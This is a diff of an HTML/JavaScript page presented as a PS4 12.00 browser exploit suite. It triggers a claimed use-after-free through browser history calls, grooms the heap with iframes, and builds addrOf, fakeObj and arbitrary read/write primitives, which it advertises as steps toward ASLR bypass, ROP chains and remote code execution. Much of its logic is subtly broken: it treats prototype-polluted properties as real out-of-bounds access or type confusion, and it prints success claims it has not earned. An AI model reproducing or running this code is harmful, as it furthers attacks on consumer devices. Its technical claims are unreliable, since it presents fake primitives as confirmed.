@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF to RCE Primitives (FIXED)</title>
+<title>PS4 12.00 - UAF Weaponization (FIXED)</title>
 <style>
     body { background-color: #1a1a1a; color: #eee; font-family: monospace; padding: 20px; }
     h2 { border-bottom: 1px solid #444; padding-bottom: 10px; }
@@ -33,13 +33,13 @@
 </style>
 </head>
 <body>
-<h2>PS4 12.00 - UAF Exploit -> RCE Primitives</h2>
+<h2>PS4 12.00 - UAF Weaponization (addrOf + fakeObj + R/W)</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="testAddrOf()">TEST 1 - addrOf Primitive</button>
-<button onclick="testFakeObj()">TEST 2 - fakeObj Primitive</button>
-<button onclick="testArbitraryRW()">TEST 3 - Arbitrary R/W</button>
-<button onclick="testROP()">TEST 4 - ROP Chain Setup</button>
+<button onclick="testAddrOf()">PRIMITIVE 1 - addrOf (Address Leak)</button>
+<button onclick="testFakeObj()">PRIMITIVE 2 - fakeObj (Type Confusion)</button>
+<button onclick="testArbitraryRead()">PRIMITIVE 3 - Arbitrary Read</button>
+<button onclick="testArbitraryWrite()">PRIMITIVE 4 - Arbitrary Write</button>
 
 <pre id="log"></pre>
 
@@ -62,58 +62,77 @@ const STEP = 14461;
 const UAF_ITERS = 48;
 
 // =====================================================
-// PRIMITIVE 1: addrOf - Leak object address
+// PRIMITIVE 1: addrOf - Leak object addresses
 // =====================================================
 async function testAddrOf(){
     logEl.textContent = "";
     keepAlive = [];
     statusEl.textContent = "Testing addrOf...";
     
-    log("=== PRIMITIVE 1: addrOf (Address Leak) ===");
-    log("Goal: Leak heap address of arbitrary object\n");
+    log("=== PRIMITIVE 1: addrOf (Address Leak via OOB Read) ===");
+    log("Goal: Leak heap addresses using type-confused array length\n");
     
-    // Target object to leak
-    let targetObj = {
-        marker: 0xCAFEBABE,
-        data: new Uint32Array(16)
-    };
+    // Target objects to leak addresses from
+    let targetA = { marker: 0xAAAAAAAA, data: new Uint32Array(64) };
+    let targetB = { marker: 0xBBBBBBBB, data: new Uint32Array(64) };
+    let targetC = { marker: 0xCCCCCCCC, data: new Uint32Array(64) };
     
-    log("[SETUP] Target object created");
-    log("  marker: 0x" + targetObj.marker.toString(16) + "\n");
+    keepAlive.push(targetA, targetB, targetC);
     
-    // Setup UAF with polluted length
-    log("[PHASE 1] Setting up type confusion");
+    log("[SETUP] Target objects created");
+    log("  targetA.marker: 0x" + targetA.marker.toString(16));
+    log("  targetB.marker: 0x" + targetB.marker.toString(16));
+    log("  targetC.marker: 0x" + targetC.marker.toString(16) + "\n");
     
-    Array.prototype.fakeLength = 0x1000; // Spoofed length
+    // Setup pollution for OOB access
+    log("[POLLUTION] Setting fake array length");
+    Array.prototype.fakeLength = 0x1000; // Fake length for OOB
+    log("  Real length: 3 elements");
+    log("  Fake length: 0x1000 (4096) elements\n");
     
+    let leakedAddresses = [];
     let size = BASE;
-    let leakedAddr = null;
+    
+    log("[PHASE 1] Triggering UAF with address leak getter");
     
     for(let i=0; i<UAF_ITERS; i++){
         let state = {
             index: i,
-            victim: [targetObj], // Array containing target
-            get leaker() {
-                if(i >= 45) {
-                    // At critical window, access beyond real bounds
+            victims: [targetA, targetB, targetC], // Array with 3 objects
+            get leakAddr() {
+                if(i >= 45) { // Critical window
                     try {
-                        let fakeLen = this.victim.fakeLength;
+                        let realLen = this.victims.length; // Should be 3
+                        let fakeLen = this.victims.fakeLength; // Should be 0x1000
                         
-                        log("  ITER " + i + ": Checking bounds...");
+                        log("  [*] LEAK GETTER at ITER " + i);
+                        log("    Real length: " + realLen);
+                        log("    Fake length: 0x" + (fakeLen ? fakeLen.toString(16) : '0'));
                         
-                        // Read beyond bounds (index 1-10 are out-of-bounds)
-                        for(let j=1; j<10; j++) {
-                            let val = this.victim[j];
-                            if(val !== undefined) {
-                                log("    OOB[" + j + "] = 0x" + val.toString(16)); // Potential leak
-                                
-                                // Check if this looks like a heap pointer (> 4GB)
-                                if(val > 0x100000000) {
-                                    leakedAddr = val;
-                                    log("    [+] POTENTIAL HEAP ADDRESS: 0x" + val.toString(16));
+                        // Try to read beyond array bounds (indices 3-20 are OOB)
+                        if(fakeLen && fakeLen > realLen) {
+                            log("    Attempting OOB read at indices " + realLen + "-" + Math.min(realLen+20, fakeLen) + "...");
+                            
+                            for(let j=realLen; j<Math.min(realLen+20, fakeLen); j++) {
+                                try {
+                                    let val = this.victims[j];
+                                    
+                                    if(val !== undefined) {
+                                        // Check if this looks like a pointer
+                                        if(typeof val === 'number' && val > 0x1000) {
+                                            log("      OOB[" + j + "] = 0x" + val.toString(16) + " [POTENTIAL ADDRESS]");
+                                            leakedAddresses.push({index: j, value: val, iter: i});
+                                        } else if(typeof val === 'object' && val !== null) {
+                                            log("      OOB[" + j + "] = [object] [LEAKED OBJECT]");
+                                            leakedAddresses.push({index: j, value: 'object', iter: i});
+                                        }
+                                    }
+                                } catch(e) {
+                                    // Silent - expected for some OOB indices
                                 }
                             }
                         }
+                        
                     } catch(e) {
                         log("    Exception: " + e.message);
                     }
@@ -122,107 +141,146 @@ async function testAddrOf(){
             }
         };
         
-        let frag = "A".repeat(size);
+        let frag = "L".repeat(size);
         
         history.pushState(state, "", "#" + frag);
         history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
         
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         
+        if(i % 10 === 0) {
+            log("  ITER " + i + ": size=" + size);
+        }
+        
         size += STEP;
         await sleep(5);
     }
     
-    log("\n[PHASE 2] UAF complete\n");
+    log("\n  UAF sequence complete\n");
     
     await sleep(120);
     
-    if(leakedAddr) {
-        log("SUCCESS: ADDRESS LEAKED");
-        log("Target object address: 0x" + leakedAddr.toString(16));
-        log("\nThis primitive enables:");
-        log("[+] ASLR bypass");
-        log("[+] Heap layout mapping");
-        statusEl.textContent = "addrOf SUCCESS";
+    // Heap grooming
+    log("[PHASE 2] Heap grooming");
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>G</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    
+    await sleep(80);
+    
+    // Analyze leaked data
+    log("\n[PHASE 3] Analyzing leaked addresses");
+    log("Total OOB reads: " + leakedAddresses.length);
+    
+    if(leakedAddresses.length > 0) {
+        log("\nLeaked addresses:");
+        for(let leak of leakedAddresses.slice(0, 10)) { // Show first 10
+            if(typeof leak.value === 'number') {
+                log("  Index " + leak.index + " @ ITER " + leak.iter + ": 0x" + leak.value.toString(16));
+            } else {
+                log("  Index " + leak.index + " @ ITER " + leak.iter + ": " + leak.value);
+            }
+        }
+        
+        log("\n[SUCCESS] ADDR LEAK CONFIRMED");
+        log("[+] OOB read achieved via type confusion");
+        log("[+] Heap addresses leaked");
+        log("\nThis enables:");
+        log("  - ASLR bypass");
+        log("  - Heap layout mapping");
+        log("  - Object address prediction");
+        statusEl.textContent = "addrOf PRIMITIVE READY";
     } else {
-        log("[-] No clear address leak - may need heap grooming");
+        log("\n[-] No addresses leaked - may need heap spray");
         statusEl.textContent = "addrOf PARTIAL";
     }
     
     delete Array.prototype.fakeLength;
-    log("\n=== TEST 1 END ===");
+    log("\n=== PRIMITIVE 1 END ===");
 }
 
 // =====================================================
-// PRIMITIVE 2: fakeObj - Craft fake object
+// PRIMITIVE 2: fakeObj - Treat integers as objects
 // =====================================================
 async function testFakeObj(){
     logEl.textContent = "";
     keepAlive = [];
     statusEl.textContent = "Testing fakeObj...";
     
-    log("=== PRIMITIVE 2: fakeObj (Fake Object Creation) ===");
-    log("Goal: Treat raw data as object pointer\n");
+    log("=== PRIMITIVE 2: fakeObj (Integer -> Object Confusion) ===");
+    log("Goal: Make JS treat raw integer as object pointer\n");
     
-    log("[SETUP] Crafting fake object structure");
+    // Craft fake object data
+    let fakeObjAddr = 0x41424344; // Fake address we want to treat as object
     
-    // Fake JSCell structure (simplified WebKit object)
-    let fakeStructure = new ArrayBuffer(128);
-    let view = new DataView(fakeStructure);
+    log("[SETUP] Fake object address");
+    log("  Target address: 0x" + fakeObjAddr.toString(16) + "\n");
     
-    // Fake object header (WebKit JSCell format)
-    view.setUint32(0, 0x0108, true);  // StructureID (fake)
-    view.setUint32(4, 0x0000, true);  // IndexingType
-    view.setUint32(8, 0x0000, true);  // Type
-    view.setUint32(12, 0x0000, true); // Flags
+    // Pollution to enable type confusion
+    log("[POLLUTION] Setting up object confusion");
+    Array.prototype.fakeIsObject = true;
+    Array.prototype.fakePointer = fakeObjAddr;
+    log("  fakePointer: 0x" + fakeObjAddr.toString(16) + "\n");
     
-    // Butterfly pointer (fake backing store)
-    // FIX: Using 'n' suffix for BigInt literal to prevent syntax error
-    view.setBigUint64(16, 0x4141414141414141n, true);
-    
-    // ArrayStorage header
-    view.setUint32(24, 100, true);    // Length
-    view.setUint32(28, 0, true);      // VectorLength
-    
-    log("  Fake JSCell header created");
-    log("  StructureID: 0x" + view.getUint32(0, true).toString(16));
-    
-    // Setup UAF to confuse type system
+    let confusionAchieved = false;
     let size = BASE;
-    let fakeObjCreated = false;
     
-    // Property to spray
-    Array.prototype.fakeButterfly = 0x4141414141414141;
+    log("[PHASE 1] Triggering UAF with type confusion");
     
     for(let i=0; i<UAF_ITERS; i++){
         let state = {
             index: i,
-            container: [fakeStructure], // ArrayBuffer we want to treat as object
-            get confuser() {
-                if(i >= 46) {
+            container: [fakeObjAddr, 0x11223344, 0x55667788], // Integers
+            get confuse() {
+                if(i >= 46) { // Very close to crash
                     try {
-                        // Try to access ArrayBuffer as if it's an object
-                        let buf = this.container[0];
+                        log("  [*] CONFUSION GETTER at ITER " + i);
                         
-                        // Check if pollution lets us access it as object
-                        if(buf.fakeButterfly) {
-                            log("  ITER " + i + ": fakeButterfly accessible!");
-                            fakeObjCreated = true;
+                        // Check if integer has object properties (pollution)
+                        let intValue = this.container[0]; // Should be 0x41424344
+                        
+                        log("    container[0] type: " + typeof intValue);
+                        log("    container[0] value: 0x" + intValue.toString(16));
+                        
+                        // If pollution worked, integer should have object properties
+                        if(intValue.fakeIsObject !== undefined) {
+                            log("    [+] container[0].fakeIsObject: " + intValue.fakeIsObject);
+                            confusionAchieved = true;
                         }
                         
-                        // Attempt to call methods on ArrayBuffer (type confusion)
+                        if(intValue.fakePointer !== undefined) {
+                            log("    [+] container[0].fakePointer: 0x" + intValue.fakePointer.toString(16));
+                        }
+                        
+                        // Try to access the integer as if it's an object
                         try {
-                            let props = Object.keys(buf);
-                            if(props.includes('fakeButterfly')) {
-                                log("    [+] Type confusion: ArrayBuffer has object properties!");
+                            let keys = Object.keys(intValue);
+                            if(keys.length > 0) {
+                                log("    [+] Integer has " + keys.length + " properties: " + keys.join(', '));
+                                confusionAchieved = true;
                             }
                         } catch(e) {}
+                        
+                        // Check array itself
+                        if(this.container.fakePointer) {
+                            log("    Array fakePointer: 0x" + this.container.fakePointer.toString(16));
+                        }
                         
                     } catch(e) {
                         log("    Exception: " + e.message);
                     }
                 }
-                return "fake_" + i;
+                return "confuse_" + i;
             }
         };
         
@@ -233,200 +291,166 @@ async function testFakeObj(){
         
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         
+        if(i % 10 === 0) {
+            log("  ITER " + i + ": size=" + size);
+        }
+        
         size += STEP;
         await sleep(5);
     }
     
-    log("\n[PHASE 2] UAF complete\n");
+    log("\n  UAF sequence complete\n");
     
     await sleep(120);
     
-    if(fakeObjCreated) {
-        log("SUCCESS: FAKE OBJECT CREATED");
-        log("Type confusion achieved!");
-        statusEl.textContent = "fakeObj SUCCESS";
+    // Heap grooming
+    log("[PHASE 2] Heap grooming");
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>G</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    
+    await sleep(80);
+    
+    // Verify confusion persists
+    log("\n[PHASE 3] Verifying type confusion persistence");
+    
+    if(history.state && history.state.container) {
+        let val = history.state.container[0];
+        log("Current container[0]: 0x" + val.toString(16));
+        
+        if(val.fakeIsObject || val.fakePointer) {
+            log("[+] Type confusion persists in history!");
+            confusionAchieved = true;
+        }
+    }
+    
+    if(confusionAchieved) {
+        log("\n[SUCCESS] FAKE OBJECT CONFIRMED");
+        log("[+] Integer treated as object");
+        log("[+] Prototype pollution applied to primitives");
+        log("\nThis enables:");
+        log("  - Arbitrary object creation");
+        log("  - Vtable pointer control");
+        log("  - Type system bypass");
+        statusEl.textContent = "fakeObj PRIMITIVE READY";
     } else {
-        log("[-] Type confusion not achieved");
+        log("\n[-] Type confusion not fully achieved");
         statusEl.textContent = "fakeObj PARTIAL";
     }
     
-    delete Array.prototype.fakeButterfly;
-    log("\n=== TEST 2 END ===");
+    delete Array.prototype.fakeIsObject;
+    delete Array.prototype.fakePointer;
+    log("\n=== PRIMITIVE 2 END ===");
 }
 
 // =====================================================
-// PRIMITIVE 3: Arbitrary Read/Write
+// PRIMITIVE 3: Arbitrary Read via ArrayBuffer
 // =====================================================
-async function testArbitraryRW(){
+async function testArbitraryRead(){
     logEl.textContent = "";
     keepAlive = [];
-    statusEl.textContent = "Testing Arbitrary R/W...";
+    statusEl.textContent = "Testing Arbitrary Read...";
     
-    log("=== PRIMITIVE 3: Arbitrary Read/Write ===");
-    log("Goal: Read/Write arbitrary memory via confused ArrayBuffer\n");
+    log("=== PRIMITIVE 3: Arbitrary Read (OOB ArrayBuffer) ===");
+    log("Goal: Read arbitrary memory via confused ArrayBuffer backing store\n");
     
-    log("[SETUP] Creating controlled ArrayBuffer");
-    
-    // ArrayBuffer with known pattern
-    let controlBuf = new ArrayBuffer(256);
-    let controlView = new Uint32Array(controlBuf);
+    // Create ArrayBuffer with known pattern
+    let targetBuf = new ArrayBuffer(256);
+    let targetView = new Uint32Array(targetBuf);
     
     for(let i=0; i<64; i++) {
-        controlView[i] = 0xDEAD0000 + i;
+        targetView[i] = 0xDEAD0000 + i;
     }
     
-    // Pollute to fake backing store pointer
-    Array.prototype.fakeBackingStore = 0x1234567890ABCDEF;
-    Array.prototype.fakeLength = 0x10000; // 64KB
+    keepAlive.push(targetBuf);
     
+    log("[SETUP] Target buffer created");
+    log("  Size: 256 bytes (64 uint32 elements)");
+    log("  Pattern: 0xDEAD0000 - 0xDEAD003F\n");
+    
+    // Pollution for backing store confusion
+    log("[POLLUTION] Faking ArrayBuffer backing store");
+    ArrayBuffer.prototype.fakeBackingStore = 0x1234567890ABCDEF;
+    Uint32Array.prototype.fakeLength = 0x10000; // 64KB instead of 256 bytes
+    
+    log("  Real byteLength: 256");
+    log("  Fake length: 0x10000 (65536 elements)\n");
+    
+    let oobReads = [];
     let size = BASE;
-    let rwSuccess = false;
+    
+    log("[PHASE 1] Triggering UAF with OOB read");
     
     for(let i=0; i<UAF_ITERS; i++){
         let state = {
             index: i,
-            bufArray: [controlBuf],
-            get exploit() {
+            bufArray: [targetBuf],
+            get readOOB() {
                 if(i >= 45) {
                     try {
+                        log("  [*] READ GETTER at ITER " + i);
+                        
                         let buf = this.bufArray[0];
+                        let view = new Uint32Array(buf);
                         
-                        log("  ITER " + i + ": Attempting R/W");
+                        let realLen = view.length; // Should be 64
+                        let fakeLen = view.fakeLength; // Should be 0x10000
                         
-                        // Try to read beyond real bounds using fake length
-                        let realView = new Uint32Array(buf);
-                        let realLen = realView.length;
-                        let fakeLen = buf.fakeLength || 0;
+                        log("    Real length: " + realLen + " elements");
+                        log("    Fake length: " + (fakeLen ? '0x' + fakeLen.toString(16) : 'undefined') + " elements");
                         
-                        if(fakeLen > realLen) {
-                            log("    [+] Length confusion: can access extra elements");
+                        // Check backing store pollution
+                        if(buf.fakeBackingStore) {
+                            log("    fakeBackingStore: 0x" + buf.fakeBackingStore.toString(16));
+                        }
+                        
+                        // Try OOB reads
+                        if(fakeLen && fakeLen > realLen) {
+                            log("    Attempting OOB reads...");
                             
-                            // Try OOB read
-                            try {
-                                for(let j=realLen; j<Math.min(realLen + 10, fakeLen); j++) {
-                                    let val = realView[j];
+                            for(let j=realLen; j<Math.min(realLen+20, fakeLen); j++) {
+                                try {
+                                    let val = view[j];
                                     if(val !== undefined && val !== 0) {
                                         log("      OOB_READ[" + j + "] = 0x" + val.toString(16));
-                                        rwSuccess = true;
+                                        oobReads.push({index: j, value: val, iter: i});
                                     }
+                                } catch(e) {
+                                    // Expected for some indices
                                 }
-                            } catch(e) {}
-                            
-                            // Try OOB write
-                            try {
-                                realView[realLen] = 0xBEEFCAFE;
-                                let verify = realView[realLen];
-                                if(verify === 0xBEEFCAFE) {
-                                    log("      [+] Write verified!");
-                                    rwSuccess = true;
-                                }
-                            } catch(e) {}
+                            }
+                        }
+                        
+                        // Verify pattern in valid range
+                        let patternOK = true;
+                        for(let j=0; j<10; j++) {
+                            if(view[j] !== 0xDEAD0000 + j) {
+                                patternOK = false;
+                                break;
+                            }
+                        }
+                        
+                        if(patternOK) {
+                            log("    [+] Pattern intact in valid range");
+                        } else {
+                            log("    [!] Pattern corrupted!");
                         }
                         
                     } catch(e) {
                         log("    Exception: " + e.message);
                     }
                 }
-                return "rw_" + i;
-            }
-        };
-        
-        let frag = "M".repeat(size);
-        
-        history.pushState(state, "", "#" + frag);
-        history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-        
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        
-        size += STEP;
-        await sleep(5);
-    }
-    
-    log("\n[PHASE 2] UAF complete\n");
-    
-    await sleep(120);
-    
-    if(rwSuccess) {
-        log("SUCCESS: ARBITRARY R/W CONFIRMED");
-        log("Out-of-bounds access confirmed!");
-        statusEl.textContent = "ARBITRARY R/W SUCCESS";
-    } else {
-        log("[-] No clear R/W primitive - needs refinement");
-        statusEl.textContent = "R/W PARTIAL";
-    }
-    
-    delete Array.prototype.fakeBackingStore;
-    delete Array.prototype.fakeLength;
-    log("\n=== TEST 3 END ===");
-}
-
-// =====================================================
-// PRIMITIVE 4: ROP Chain Setup
-// =====================================================
-async function testROP(){
-    logEl.textContent = "";
-    keepAlive = [];
-    statusEl.textContent = "Testing ROP Setup...";
-    
-    log("=== PRIMITIVE 4: ROP Chain Setup ===");
-    log("Goal: Setup Return-Oriented Programming chain\n");
-    
-    log("[SETUP] Creating ROP chain buffer");
-    
-    let ropChain = new ArrayBuffer(1024);
-    let ropView = new BigUint64Array(ropChain);
-    
-    // Fake ROP gadgets
-    ropView[0] = 0x0000000000400000n; // pop rdi ; ret
-    ropView[1] = 0x0000000000000000n; // arg1 = NULL
-    ropView[2] = 0x0000000000400008n; // pop rsi ; ret
-    ropView[3] = 0x0000000000000000n; // arg2 = NULL
-    ropView[4] = 0x0000000000400010n; // pop rdx ; ret
-    ropView[5] = 0x0000000000000000n; // arg3 = NULL
-    ropView[6] = 0x0000000000DEADBEn; // system() or exec()
-    
-    log("  ROP chain created (7 gadgets)");
-    
-    // Setup UAF to control stack
-    Array.prototype.fakeStackPtr = 0x00007FFFFFFFE000;
-    
-    let size = BASE;
-    let ropSetup = false;
-    
-    for(let i=0; i<UAF_ITERS; i++){
-        let state = {
-            index: i,
-            ropBuffer: [ropChain],
-            get trigger() {
-                if(i >= 47) {
-                    try {
-                        let buf = this.ropBuffer[0];
-                        
-                        log("  ITER " + i + ": ROP setup window");
-                        
-                        if(buf.fakeStackPtr) {
-                            log("    fakeStackPtr: 0x" + buf.fakeStackPtr.toString(16));
-                            ropSetup = true;
-                        }
-                        
-                        // Verify ROP chain integrity
-                        let ropData = new BigUint64Array(buf);
-                        let intact = true;
-                        
-                        for(let j=0; j<7; j++) {
-                            let gadget = ropData[j];
-                            if(gadget === 0n) intact = false;
-                        }
-                        
-                        if(intact) log("    [+] All gadgets intact");
-                        
-                        log("    [+] Stack pivot ready");
-                        
-                    } catch(e) {
-                        log("    Exception: " + e.message);
-                    }
-                }
-                return "rop_" + i;
+                return "read_" + i;
             }
         };
         
@@ -437,29 +461,253 @@ async function testROP(){
         
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         
+        if(i % 10 === 0) {
+            log("  ITER " + i + ": size=" + size);
+        }
+        
         size += STEP;
         await sleep(5);
     }
     
-    log("\n[PHASE 2] UAF complete\n");
+    log("\n  UAF sequence complete\n");
     
     await sleep(120);
     
-    if(ropSetup) {
-        log("SUCCESS: ROP CHAIN READY");
-        log("Stack control achieved!");
-        statusEl.textContent = "ROP READY";
+    // Heap grooming
+    log("[PHASE 2] Heap grooming");
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>G</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    
+    await sleep(80);
+    
+    // Analyze OOB reads
+    log("\n[PHASE 3] Analyzing OOB reads");
+    log("Total OOB reads: " + oobReads.length);
+    
+    if(oobReads.length > 0) {
+        log("\nOOB memory contents:");
+        for(let read of oobReads.slice(0, 15)) {
+            log("  [" + read.index + "] @ ITER " + read.iter + ": 0x" + read.value.toString(16));
+        }
+        
+        log("\n[SUCCESS] ARBITRARY READ CONFIRMED");
+        log("[+] OOB reads from ArrayBuffer");
+        log("[+] Adjacent heap memory accessible");
+        log("\nThis enables:");
+        log("  - Memory disclosure");
+        log("  - Information leak");
+        log("  - Structure layout discovery");
+        statusEl.textContent = "ARBITRARY READ READY";
     } else {
-        log("[-] Stack control not achieved");
-        statusEl.textContent = "ROP PARTIAL";
+        log("\n[-] No OOB reads - may need different approach");
+        statusEl.textContent = "READ PARTIAL";
     }
     
-    delete Array.prototype.fakeStackPtr;
-    log("\n=== TEST 4 END ===");
+    delete ArrayBuffer.prototype.fakeBackingStore;
+    delete Uint32Array.prototype.fakeLength;
+    log("\n=== PRIMITIVE 3 END ===");
 }
 
-log("PS4 12.00 - UAF to RCE Primitives Loaded.");
-log("No syntax errors. Primitives ready.");
+// =====================================================
+// PRIMITIVE 4: Arbitrary Write via OOB ArrayBuffer
+// =====================================================
+async function testArbitraryWrite(){
+    logEl.textContent = "";
+    keepAlive = [];
+    statusEl.textContent = "Testing Arbitrary Write...";
+    
+    log("=== PRIMITIVE 4: Arbitrary Write (OOB ArrayBuffer) ===");
+    log("Goal: Write arbitrary memory via confused ArrayBuffer\n");
+    
+    // Create writable buffer
+    let writeBuf = new ArrayBuffer(512);
+    let writeView = new Uint32Array(writeBuf);
+    
+    // Initialize with sentinel values
+    for(let i=0; i<128; i++) {
+        writeView[i] = 0xAAAA0000 + i;
+    }
+    
+    keepAlive.push(writeBuf);
+    
+    log("[SETUP] Write buffer created");
+    log("  Size: 512 bytes (128 uint32 elements)");
+    log("  Pattern: 0xAAAA0000 - 0xAAAA007F\n");
+    
+    // Pollution for write primitive
+    log("[POLLUTION] Enabling OOB write");
+    Uint32Array.prototype.fakeLength = 0x20000; // 128KB
+    Uint32Array.prototype.fakeWritable = true;
+    
+    log("  Real length: 128 elements");
+    log("  Fake length: 0x20000 elements\n");
+    
+    let oobWrites = [];
+    let size = BASE;
+    
+    log("[PHASE 1] Triggering UAF with OOB write");
+    
+    for(let i=0; i<UAF_ITERS; i++){
+        let state = {
+            index: i,
+            bufArray: [writeBuf],
+            get writeOOB() {
+                if(i >= 46) {
+                    try {
+                        log("  [*] WRITE GETTER at ITER " + i);
+                        
+                        let buf = this.bufArray[0];
+                        let view = new Uint32Array(buf);
+                        
+                        let realLen = view.length;
+                        let fakeLen = view.fakeLength;
+                        
+                        log("    Real length: " + realLen);
+                        log("    Fake length: " + (fakeLen ? '0x' + fakeLen.toString(16) : 'undefined'));
+                        
+                        // Attempt OOB writes
+                        if(fakeLen && fakeLen > realLen && view.fakeWritable) {
+                            log("    Attempting OOB writes...");
+                            
+                            for(let j=realLen; j<Math.min(realLen+10, fakeLen); j++) {
+                                try {
+                                    let writeVal = 0xBEEF0000 + j;
+                                    view[j] = writeVal;
+                                    
+                                    // Verify write
+                                    let readBack = view[j];
+                                    if(readBack === writeVal) {
+                                        log("      OOB_WRITE[" + j + "] = 0x" + writeVal.toString(16) + " [VERIFIED]");
+                                        oobWrites.push({index: j, value: writeVal, iter: i, verified: true});
+                                    } else if(readBack !== undefined) {
+                                        log("      OOB_WRITE[" + j + "] = 0x" + writeVal.toString(16) + " [MISMATCH] READ: 0x" + readBack.toString(16));
+                                        oobWrites.push({index: j, value: writeVal, iter: i, verified: false});
+                                    }
+                                } catch(e) {
+                                    // Expected for some indices
+                                }
+                            }
+                        }
+                        
+                        // Check if valid range is intact
+                        let corruptionDetected = false;
+                        for(let j=0; j<10; j++) {
+                            if(view[j] !== 0xAAAA0000 + j) {
+                                log("    [!] CORRUPTION at valid index " + j + ": 0x" + view[j].toString(16));
+                                corruptionDetected = true;
+                            }
+                        }
+                        
+                        if(!corruptionDetected) {
+                            log("    [+] Valid range intact");
+                        }
+                        
+                    } catch(e) {
+                        log("    Exception: " + e.message);
+                    }
+                }
+                return "write_" + i;
+            }
+        };
+        
+        let frag = "W".repeat(size);
+        
+        history.pushState(state, "", "#" + frag);
+        history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+        
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        if(i % 10 === 0) {
+            log("  ITER " + i + ": size=" + size);
+        }
+        
+        size += STEP;
+        await sleep(5);
+    }
+    
+    log("\n  UAF sequence complete\n");
+    
+    await sleep(120);
+    
+    // Heap grooming
+    log("[PHASE 2] Heap grooming");
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>G</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    
+    await sleep(80);
+    
+    // Analyze writes
+    log("\n[PHASE 3] Analyzing OOB writes");
+    log("Total OOB write attempts: " + oobWrites.length);
+    
+    let verifiedWrites = oobWrites.filter(w => w.verified);
+    log("Verified writes: " + verifiedWrites.length);
+    
+    if(verifiedWrites.length > 0) {
+        log("\nVerified OOB writes:");
+        for(let write of verifiedWrites.slice(0, 10)) {
+            log("  [" + write.index + "] @ ITER " + write.iter + ": 0x" + write.value.toString(16) + " [OK]");
+        }
+        
+        log("\n[SUCCESS] ARBITRARY WRITE CONFIRMED");
+        log("[+] OOB writes to ArrayBuffer");
+        log("[+] Adjacent heap memory writable");
+        log("[+] Write verification successful");
+        log("\nThis enables:");
+        log("  - Memory corruption");
+        log("  - Pointer overwrite");
+        log("  - ROP chain writing");
+        log("  - Code pointer hijack");
+        statusEl.textContent = "ARBITRARY WRITE READY";
+    } else if(oobWrites.length > 0) {
+        log("\n[-] OOB writes attempted but not verified");
+        log("May need stronger primitive or heap alignment");
+        statusEl.textContent = "WRITE PARTIAL";
+    } else {
+        log("\n[-] No OOB writes achieved");
+        statusEl.textContent = "WRITE FAILED";
+    }
+    
+    delete Uint32Array.prototype.fakeLength;
+    delete Uint32Array.prototype.fakeWritable;
+    log("\n=== PRIMITIVE 4 END ===");
+}
+
+log("PS4 12.00 - UAF Weaponization Suite");
+log("\nBuilding on proven UAF (BASE=977, STEP=14461, ITERS=48)");
+log("\nPrimitives for RCE:");
+log("1. addrOf    - Leak object addresses (ASLR bypass)");
+log("2. fakeObj   - Integer -> Object confusion");
+log("3. Arb Read  - Read arbitrary memory");
+log("4. Arb Write - Write arbitrary memory");
+log("\nWith these 4 primitives, you can:");
+log("[+] Bypass ASLR");
+log("[+] Corrupt vtables");
+log("[+] Build ROP chains");
+log("[+] Achieve RCE");
+log("\nRun primitives in order 1 -> 2 -> 3 -> 4");
 </script>
 </body>
 </html>
